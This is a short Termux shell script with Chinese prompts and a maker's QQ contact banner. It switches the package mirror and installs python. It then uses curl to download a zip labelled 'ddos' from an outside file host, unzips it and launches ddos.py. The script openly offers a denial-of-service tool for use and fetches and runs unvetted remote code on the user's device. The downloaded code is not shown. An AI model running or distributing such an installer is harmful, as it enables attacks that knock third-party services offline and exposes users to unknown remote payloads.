clear
echo -e "\e[1;34mNAS油条制作\e[0m"
echo -e "\e[1;34mQQ:3213631396\e[0m"
echo -e "\e[1;34mQQ群:188056055\e[0m"
echo 按回车后开始安装。
read
clear
echo 切换清华下载源
sleep 1s
echo
sed -i 's@^\(deb.*stable main\)$@#\1\ndeb https://mirrors.tuna.tsinghua.edu.cn/termux/termux-packages-24 stable main@' $PREFIX/etc/apt/sources.list
clear
sleep 1s
echo 更新资源中
echo 途中请输入y回车
sleep 2s
apt update
apt upgrade
echo 更新完成
clear
echo 正在安装 figlet
sleep 1s
pkg install figlet
clear
echo 正在安装 python
echo 途中可能会停止请输入y继续
echo 等的时间可能有点长,请耐心等待。
sleep 2s
pkg install python
clear
echo 当前 python 版本
sleep 1s
python -V
sleep 3s
clear
echo 正在安装 ddos
curl -o ddos.zip https://cccimg.com/down.php/576c81c114e3a3c1b3e702bd19117594.zip
unzip ddos.zip
sleep 1s
clear
echo 以后请输入以下命令启动
echo python ddos/ddos.py
echo
echo 按回车键继续
read
cd ddos
echo ⑥正在启动ddos
sleep 3s
python ddos.py